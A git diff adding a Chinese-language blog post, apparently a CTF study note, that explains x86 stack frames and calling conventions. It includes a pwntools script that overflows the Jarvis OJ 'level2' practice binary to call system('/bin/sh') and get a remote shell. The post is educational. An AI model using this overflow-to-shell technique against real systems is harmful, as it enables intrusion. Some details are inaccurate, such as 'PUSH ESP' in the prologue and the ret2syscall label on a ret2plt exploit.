@@ -396,6 +396,249 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/05/08/ret2syscall/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Lhy And Fyt">
+      <meta itemprop="description" content="This is a technique shareing blog.">
+      <meta itemprop="image" content="/uploads/20190320100718.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="L&F">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2019/05/08/ret2syscall/" class="post-title-link" itemprop="url">ret2syscall</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-05-08 21:10:36 / 修改时间：21:34:00" itemprop="dateCreated datePublished" datetime="2019-05-08T21:10:36+08:00">2019-05-08</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h3 id="ROP-原理："><a href="#ROP-原理：" class="headerlink" title="ROP 原理："></a>ROP 原理：</h3><p>主函数通过__cdcall方式进行函数压栈：</p>
+<p>PUSH PART2</p>
+<p>PUSH PART1</p>
+<p>主函数通过call指令完成指令转移：</p>
+<p>call(</p>
+<p>PUSH EIP</p>
+<p>JUMP NEXT</p>
+<p>)</p>
+<p>子函数开辟堆栈空间：</p>
+<p>PUSH ESP </p>
+<p>MOV EBP, ESP</p>
+<p>SUB ESP, 80H</p>
+<p>子函数清空栈空间并返回上级函数栈空间：</p>
+<p>LEAVE(</p>
+<p>MOV ESP,EBP</p>
+<p>POP EBP</p>
+<p>)</p>
+<p>子函数通过RET指令完成指令跳转：</p>
+<p>RET(</p>
+<p>POP EIP</p>
+<p>)</p>
+<p>具体如图所示：</p>
+<p><img src="/2019/05/08/ret2syscall/ROP.png" alt="ROP"></p>
+<h4 id="例题："><a href="#例题：" class="headerlink" title="例题："></a>例题：</h4><p>Jarvis：[XMAN]level2</p>
+<p><strong>nc pwn2.jarvisoj.com 9878</strong></p>
+<p><a href="https://dn.jarvisoj.com/challengefiles/level2.54931449c557d0551c4fc2a10f4778a1" target="_blank" rel="noopener">level2.54931449c557d0551c4fc2a10f4778a1</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process('./level2')</span></span><br><span class="line">p = remote(<span class="string">'pwn2.jarvisoj.com'</span>,<span class="number">9878</span>)</span><br><span class="line">elf = ELF(<span class="string">"./level2"</span>)</span><br><span class="line">system_addr = elf.plt[<span class="string">"system"</span>]</span><br><span class="line"><span class="comment"># binsh_addr = elf.plt["/bin/sh"]</span></span><br><span class="line">binsh_addr = <span class="number">0x0804A024</span></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x8c</span>  + p32(system_addr) + <span class="string">'juck'</span>  + p32(binsh_addr) <span class="comment"># 中间的junk就是用来填充system_ret用的。</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>
+<h4 id="调用方式总结"><a href="#调用方式总结" class="headerlink" title="调用方式总结"></a>调用方式总结</h4><table>
+<thead>
+<tr>
+<th>调用约定</th>
+<th>堆栈清除</th>
+<th>参数传递</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>__cdcall</td>
+<td>调用者</td>
+<td>从右到左，通过堆栈传递</td>
+</tr>
+<tr>
+<td>__stdcall</td>
+<td>函数体</td>
+<td>从右到左，通过堆栈传递</td>
+</tr>
+<tr>
+<td>__fastcall</td>
+<td>函数体</td>
+<td>从右到左，优先使用寄存器(ECX，EDX)，然后使用堆栈</td>
+</tr>
+<tr>
+<td>thiscall</td>
+<td>函数体</td>
+<td>this指针默认通过ECX传递，其他参数从右到左入栈</td>
+</tr>
+</tbody>
+</table>
+<h4 id="一个例子"><a href="#一个例子" class="headerlink" title="一个例子"></a>一个例子</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span>   </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span> z)</span>   </span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"x = %d at [%X]n"</span>, x, &amp;x);   </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"y = %d at [%X]n"</span>, y, &amp;y);   </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"z = %d at [%X]n"</span>, z, &amp;z);   </span><br><span class="line">&#125;   </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span>   </span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line">foo(<span class="number">100</span>, <span class="number">200</span>, <span class="number">300</span>);   </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>运行结果： </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x = 100 at [BFE28760] </span><br><span class="line">y = 200 at [BFE28764] </span><br><span class="line">z = 300 at [BFE28768]</span><br></pre></td></tr></table></figure>
+<h4 id="第二个例子："><a href="#第二个例子：" class="headerlink" title="第二个例子："></a>第二个例子：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">.text:08048480</span><br><span class="line">.text:08048480 ; =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:08048480</span><br><span class="line">.text:08048480 ; Attributes: bp-based frame</span><br><span class="line">.text:08048480</span><br><span class="line">.text:08048480 ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:08048480                 public main</span><br><span class="line">.text:08048480 main            proc near               ; DATA XREF: _start+17↑o</span><br><span class="line">.text:08048480</span><br><span class="line">.text:08048480 var_4           = dword ptr -4</span><br><span class="line">.text:08048480 argc            = dword ptr  8</span><br><span class="line">.text:08048480 argv            = dword ptr  0Ch</span><br><span class="line">.text:08048480 envp            = dword ptr  10h</span><br><span class="line">.text:08048480</span><br><span class="line">.text:08048480 ; __unwind &#123;</span><br><span class="line">.text:08048480                 lea     ecx, [esp+4]</span><br><span class="line">.text:08048484                 and     esp, 0FFFFFFF0h</span><br><span class="line">.text:08048487                 push    dword ptr [ecx-4]</span><br><span class="line">.text:0804848A                 push    ebp</span><br><span class="line">.text:0804848B                 mov     ebp, esp</span><br><span class="line">.text:0804848D                 push    ecx</span><br><span class="line">.text:0804848E                 sub     esp, 4</span><br><span class="line">.text:08048491                 call    vulnerable_function</span><br><span class="line">.text:08048496                 sub     esp, 0Ch</span><br><span class="line">.text:08048499                 push    offset aEchoHelloWorld ; &quot;echo &apos;Hello World!&apos;&quot;</span><br><span class="line">.text:0804849E                 call    _system</span><br><span class="line">.text:080484A3                 add     esp, 10h</span><br><span class="line">.text:080484A6                 mov     eax, 0</span><br><span class="line">.text:080484AB                 mov     ecx, [ebp+var_4]</span><br><span class="line">.text:080484AE                 leave</span><br><span class="line">.text:080484AF                 lea     esp, [ecx-4]</span><br><span class="line">.text:080484B2                 retn</span><br><span class="line">.text:080484B2 ; &#125; // starts at 8048480</span><br><span class="line">.text:080484B2 main            endp</span><br><span class="line">.text:080484B2</span><br><span class="line">.text:080484B2 ; ---------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">.text:0804844B</span><br><span class="line">.text:0804844B ; =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:0804844B</span><br><span class="line">.text:0804844B ; Attributes: bp-based frame</span><br><span class="line">.text:0804844B</span><br><span class="line">.text:0804844B                 public vulnerable_function</span><br><span class="line">.text:0804844B vulnerable_function proc near           ; CODE XREF: main+11↓p</span><br><span class="line">.text:0804844B</span><br><span class="line">.text:0804844B buf             = byte ptr -88h</span><br><span class="line">.text:0804844B</span><br><span class="line">.text:0804844B ; __unwind &#123;</span><br><span class="line">.text:0804844B                 push    ebp				; 保存上一个栈帧的基址</span><br><span class="line">.text:0804844C                 mov     ebp, esp			; 设置新一个栈帧的基址</span><br><span class="line">.text:0804844E                 sub     esp, 88h			; 开辟栈帧空间</span><br><span class="line">.text:08048454                 sub     esp, 0Ch			; ？？？</span><br><span class="line">.text:08048457                 push    offset command  	; &quot;echo Input:&quot; 压入第一个参数</span><br><span class="line">.text:0804845C                 call    _system			; call指令转移 push eip; jump next</span><br><span class="line">.text:08048461                 add     esp, 10h			; 主函数清空参数</span><br><span class="line">.text:08048464                 sub     esp, 4			; ???	</span><br><span class="line">------------------------------------------函数调用-----------------------------------------</span><br><span class="line">.text:08048467                 push    100h            	; nbytes压入第三个参数</span><br><span class="line">.text:0804846C                 lea     eax, [ebp+buf]	; 获取buf地址</span><br><span class="line">.text:08048472                 push    eax             	; buf 压入第二个参数</span><br><span class="line">.text:08048473                 push    0               	; fd 压入第一个参数</span><br><span class="line">.text:08048475                 call    _read			; call指令转移 push eip; jump next</span><br><span class="line">.text:0804847A                 add     esp, 10h			; 主函数清空参数 正好请调四个压入栈的32															位数</span><br><span class="line">------------------------------------------------------------------------------------------------------------------------------------函数返回----------------------------------------</span><br><span class="line">.text:0804847D                 nop</span><br><span class="line">.text:0804847E                 leave					; leave指令清空MOV ESP,EBP; POP EBP															 返回上一个栈帧</span><br><span class="line">.text:0804847F                 retn						; POP EIP 继续主函数未完成的指令</span><br><span class="line">.text:0804847F ; &#125; // starts at 804844B</span><br><span class="line">.text:0804847F vulnerable_function endp</span><br><span class="line">.text:0804847F</span><br></pre></td></tr></table></figure>
+<h4 id="为什么函数参数要自右向左压栈？"><a href="#为什么函数参数要自右向左压栈？" class="headerlink" title="为什么函数参数要自右向左压栈？"></a>为什么函数参数要自右向左压栈？</h4><p>C程序栈底为高地址，栈顶为低地址，因此上面的实例可以说明函数参数入栈顺序的确是从右至左的。 </p>
+<p>进一步发现，C语言支持可变长参数，而C语言支持这种特色，正是这个原因使得C语言函数参数入栈顺序为从右至左。通过栈堆分析可知，自左向右的入栈方式，最前面的参数被压在栈底。除非知道参数个数，否则是无法通过<strong>栈指针的相对位移</strong>求得最左边的参数。这样就变成了左边参数的个数不确定，正好和动态参数个数的方向相反。 (如果是从右往左进栈，根据栈后进先出的特性，靠左的参数离栈顶越近，在进入新函数栈帧后，EBP+8位函数的第一次个参数，EBP+12位函数的第二个参数)</p>
+<h4 id="stdcall与C调用约定-cdecl-的区别"><a href="#stdcall与C调用约定-cdecl-的区别" class="headerlink" title="__stdcall与C调用约定(__cdecl)的区别"></a>__stdcall与C调用约定(__cdecl)的区别</h4><p>C调用约定在返回前,要作一次堆栈平衡,也就是参数入栈了多少字节,就要弹出来多少字节.这样很安全. </p>
+<p>有一点需要注意:stdcall调用约定如果采用了不定参数,即VARARG的话,则和C调用约定一样,要由调用者来作堆栈平衡. </p>
+<ol>
+<li><strong>__stdcall</strong>是Pascal方式清理C方式压栈，通常用于Win32  Api中，函数采用从右到左的压栈方式，自己在退出时清空堆栈。VC将函数编译后会在函数名前面加上下划线前缀，在函数名后加上”@”和参数的字节数。  int f(void *p) –&gt;&gt; _f@4(在外部汇编语言里可以用这个名字引用这个函数) </li>
+</ol>
+<p>​    在WIN32 API中,只有少数几个函数,如wspintf函数是采用C调用约定,其他都是stdcall </p>
+<ol start="2">
+<li><strong>C调用约定</strong>（即用__cdecl关键字说明）（The  C default calling  convention）按从右至左的顺序压参数入栈，由调用者把参数弹出栈。对于传送参数的内存栈是由调用者来维护的（正因为如此，实现可变参数vararg的函数(如printf)只能使用该调用约定）。另外，在函数名修饰约定方面也有所不同。   _cdecl是C和C＋＋程序的缺省调用方式。每一个调用它的函数都包含清空堆栈的代码，所以产生的可执行文件大小会比调用_stdcall函数的大。函数采用从右到左的压栈方式。VC将函数编译后会在函数名前面加上下划线前缀。 </li>
+<li><strong>__fastcall</strong>调用的主要特点就是快，因为它是通过寄存器来传送参数的（实际上，它用ECX和EDX传送前两个双字（DWORD）或更小的参数，剩下的参数仍旧自右向左压栈传送，被调用的函数在返回前清理传送参数的内存栈），在函数名修饰约定方面，它和前两者均不同。__fastcall方式的函数采用寄存器传递参数，VC将函数编译后会在函数名前面加上”@”前缀，在函数名后加上”@”和参数的字节数。 </li>
+<li><strong>thiscall</strong>仅仅应用于”C++”成员函数。this指针存放于CX/ECX寄存器中，参数从右到左压。thiscall不是关键词，因此不能被程序员指定。 </li>
+<li><strong>naked call</strong>。 当采用1-4的调用约定时，如果必要的话，进入函数时编译器会产生代码来保存ESI，EDI，EBX，EBP寄存器，退出函数时则产生代码恢复这些寄存器的内容。 (这些代码称作 prolog and epilog code,一般，ebp,esp的保存是必须的). 但是naked call不产生这样的代码。naked call不是类型修饰符，故必须和_declspec共同使用。 </li>
+</ol>
+<p>关键字 <strong>stdcall、</strong>cdecl和<strong>fastcall可以直接加在要输出的函数前。它们对应的命令行参数分别为/Gz、/Gd和/Gr。缺省状态为/Gd，即</strong>cdecl。 </p>
+<p>要完全模仿PASCAL调用约定首先必须使用<strong>stdcall调用约定，至于函数名修饰约定，可以通过其它方法模仿。还有一个值得一提的是WINAPI宏，Windows.h支持该宏，它可以将出函数翻译成适当的调用约定，在WIN32中，它被定义为</strong>stdcall。使用WINAPI宏可以创建自己的APIs。     </p>
+<blockquote>
+<p>call、ret指令，本质上还是汇编『跳转指令』，它们都用于修改IP，或同时修改CS和IP；这两个指令经常被用来实现子程序的设计</p>
+</blockquote>
+<hr>
+<h4 id="ret指令和retf指令"><a href="#ret指令和retf指令" class="headerlink" title="ret指令和retf指令"></a>ret指令和retf指令</h4><p>ret指令用栈中的数据，修改IP的内容，从而实现近转移<br>retf指令用栈的数据，修改CS和IP的内容，从而实现远转移</p>
+<p>CPU执行ret指令时，相当于进行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pop IP</span><br></pre></td></tr></table></figure>
+<p>CPU执行retf指令时，相当于进行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pop IP</span><br><span class="line">pop CS</span><br></pre></td></tr></table></figure>
+<h4 id="call指令"><a href="#call指令" class="headerlink" title="call指令"></a>call指令</h4><p>当执行call指令时，进行两步操作： </p>
+<ol>
+<li>将当前的IP或CS和IP压入栈中</li>
+<li>转移</li>
+</ol>
+<p>call指令不能实现短转移，它的书写格式同jmp指令</p>
+<p>依据标号进行转移的call指令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">语法格式：call 标号 </span><br><span class="line">汇编解释：(1) push IP  (2) jmp near ptr 标号</span><br></pre></td></tr></table></figure>
+<p>依据目的地址在指令中的call指令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">语法格式：call far ptr 标号</span><br><span class="line">汇编解释：(1) push CS  (2) push IP  (3) jmp far ptr 标号</span><br></pre></td></tr></table></figure>
+<p>转移地址在寄存器中的call指令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">语法格式：call 16位reg</span><br><span class="line">汇编解释：(1) push IP  (2) jmp 16位reg</span><br></pre></td></tr></table></figure>
+<p>转移地址在内存中的call指令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">语法格式一：call word ptr 内存单元地址</span><br><span class="line">汇编解释一：(1) push IP  (2) jmp word ptr 内存单元地址</span><br><span class="line"></span><br><span class="line">语法格式二：call dword ptr 内存单元地址</span><br><span class="line">汇编解释二：(1) push CS  (2) push IP  (3) jmp dword ptr 内存单元地址</span><br></pre></td></tr></table></figure>
+<h4 id="leave"><a href="#leave" class="headerlink" title="leave"></a>leave</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">在16位汇编下相当于:</span><br><span class="line">mov sp,bp</span><br><span class="line">pop bp</span><br><span class="line">在32位汇编下相当于:</span><br><span class="line">mov esp,ebp</span><br><span class="line">pop ebp</span><br><span class="line">/* leave指令将EBP寄存器的内容复制到ESP寄存器中，</span><br><span class="line">以释放分配给该过程的所有堆栈空间。然后，它从堆栈恢复EBP寄存器的旧值。*/</span><br></pre></td></tr></table></figure>
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/09/How-to-Write-a-Spider/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1877,7 +2120,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">8</span>
+                    <span class="site-state-item-count">9</span>
                     <span class="site-state-item-name">日志</span>
                   </a>
                 </div>
@@ -1906,7 +2149,11 @@
                     
                       
                     
-                    <span class="site-state-item-count">7</span>
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">9</span>
                     <span class="site-state-item-name">标签</span>
                   
                 </div>
